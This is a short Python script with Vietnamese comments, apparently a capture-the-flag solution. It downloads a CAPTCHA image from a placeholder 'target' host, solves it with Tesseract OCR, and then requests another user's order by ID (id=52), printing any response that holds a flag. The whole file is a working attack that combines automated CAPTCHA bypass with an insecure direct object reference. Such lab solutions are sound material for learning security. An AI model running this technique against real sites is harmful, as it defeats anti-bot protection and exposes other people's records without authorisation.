import requests
from PIL import Image
import pytesseract
from io import BytesIO

s = requests.Session()

# 1. Lấy CAPTCHA
r = s.get("http://target/captcha/image")
img = Image.open(BytesIO(r.content))

# 2. OCR
captcha = pytesseract.image_to_string(img, config="--psm 7 -c tessedit_char_whitelist=ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789").strip()

# 3. Gửi truy vấn id=52
params = {'id': '52', 'captcha': captcha}
r2 = s.get("http://target/orders/view", params=params)

if "FLAG" in r2.text:
    print("FLAG FOUND:", r2.text)
